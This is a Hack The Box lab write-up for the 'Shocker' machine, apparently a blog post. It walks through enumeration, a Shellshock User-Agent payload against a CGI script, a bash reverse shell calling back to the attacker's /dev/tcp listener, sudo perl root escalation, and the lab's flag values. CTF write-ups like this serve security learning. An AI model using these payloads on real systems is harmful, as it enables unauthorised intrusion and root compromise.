{"title":"HTB - Shocker","slug":"Shocker","html":"<h1 id=\"shocker---10101056\">Shocker - 10.10.10.56</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.56 </code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 22:13 EDT\nNmap scan report for 10.10.10.56\nHost is up (0.24s latency).\nNot shown: 998 closed ports\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site does not have a title (text/html).\n2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.91 seconds</code></pre><p>The Ubuntu version is most likely <strong>Xenial</strong>, source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://packages.ubuntu.com/search?keywords=apache2\">https://packages.ubuntu.com/search?keywords=apache2</a></p>\n<p><img src=\"Shocker.assets/image-20210425225756592.png\" alt=\"\"></p>\n<h2 id=\"gobuster\">Gobuster</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 30 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.56 -o log/gobuster.out </code></pre><p><img src=\"Shocker.assets/image-20210425225231743.png\" alt=\"\"></p>\n<p>The directory <strong>/cgi-bin/</strong> is used when apache gives a certain tasks to a scripting language such as Bash, Python.</p>\n<p>The status 403 just means that the directory is present but the attacker does not have access to it.</p>\n<p><img src=\"Shocker.assets/image-20210425230223506.png\" alt=\"\"></p>\n<p>This indicates that a shellshock attack can be used, given the name of the machine is also shocker.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 30 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.56/cgi-bin -x sh,py,txt,pl -o log/gobuster_cgi-bin.out</code></pre><p>Even if an attacker cannot list the contents of the <strong>/cgi-bin/</strong> directory, the files can still be accessed if the name of the file is known.</p>\n<p>Gobuster is being ran with several extensions to find if there are any files present. </p>\n<p><img src=\"Shocker.assets/image-20210425230918395.png\" alt=\"\"></p>\n<p>The file <strong>user.sh</strong> is found in the <strong>/cgi-bin/</strong> directory. On going to the file, the attacker is prompted to download dialog.</p>\n<p><img src=\"Shocker.assets/image-20210425231530638.png\" alt=\"\"></p>\n<p>The content of <strong>user.sh</strong> looks to be the output of the bash command <strong>uptime</strong></p>\n<p><img src=\"Shocker.assets/image-20210425231801722.png\" alt=\"\"></p>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h2 id=\"shellshock\">Shellshock</h2>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Shellshock, also known as Bashdoor, is a family of security bugs in the  widely used Unix Bash shell, the first of which was disclosed on 24  September 2014. Many Internet-facing services, such as some web server  deployments, use Bash to process certain requests, allowing an attacker  to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.</p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/opsxcq/exploit-CVE-2014-6271\">https://github.com/opsxcq/exploit-CVE-2014-6271</a></p>\n<p>Upon testing a shellshock exploitation payload, it is concluded the web server is <strong>vulnerable to the shellshock attack</strong>. </p>\n<pre class=\"language-bash\"><code class=\"language-bash\">curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'echo I was here'\" \"http://10.10.10.56/cgi-bin/user.sh\"</code></pre><p><img src=\"Shocker.assets/image-20210425232500964.png\" alt=\"\"></p>\n<h3 id=\"getting-a-reverse-shell\">Getting a reverse shell</h3>\n<p>The tools used here to generate quick  reverse shell is called <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mthbernardes/rsg\">rsg or reverse shell generator</a></p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># generates payload and as well as listens on the specified port\nrsg 10.10.14.23 8888 bash \n# make the server connect back to the attacker using shellshock payload with bash reverse shell\ncurl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >&amp; /dev/tcp/10.10.14.23/8888 0>&amp;1'\" \"http://10.10.10.56/cgi-bin/user.sh\" </code></pre><p><img src=\"Shocker.assets/image-20210426000718594.png\" alt=\"\"></p>\n<p>A reverse shell is obtained as the user <strong>shelly</strong>. </p>\n<p><img src=\"Shocker.assets/image-20210426011418915.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<p><strong>User.txt</strong> can be found in the home directory of <strong>shelly</strong>.</p>\n<p><img src=\"Shocker.assets/image-20210426011945515.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt: 4ddc9c1abd1d367712b3dd434eaf1a9b</p>\n</blockquote>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>The user shelly can execute perl as root</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">sudo -l</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">Matching Defaults entries for shelly on Shocker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser shelly may run the following commands on Shocker:\n    (root) NOPASSWD: /usr/bin/perl</code></pre><p><img src=\"Shocker.assets/image-20210426012413725.png\" alt=\"\"></p>\n<h3 id=\"vulnerability-explanation-1\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"https://gtfobins.github.io/gtfobins/\">gtfobins</a>, and searching for <strong>perl</strong>, it can be found that, perl can be used to spawn a shell.\nRunning perl as root, the attacker can break out from the restricted environment.</p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://gtfobins.github.io/gtfobins/perl/\">https://gtfobins.github.io/gtfobins/perl/</a></p>\n<p><img src=\"Shocker.assets/image-20210426012904228.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">sudo -l\nsudo /usr/bin/perl -e 'exec \"/bin/bash\";'\nwhoami</code></pre><p><img src=\"Shocker.assets/image-20210426013049169.png\" alt=\"\"></p>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<p><img src=\"Shocker.assets/image-20210426013339340.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt: 8d54789661e7e922780f49e1e2bfded1</p>\n</blockquote>\n","date":"2021-04-25","excerpt":"","printDate":"April 25, 2021","printReadingTime":"4 min read"}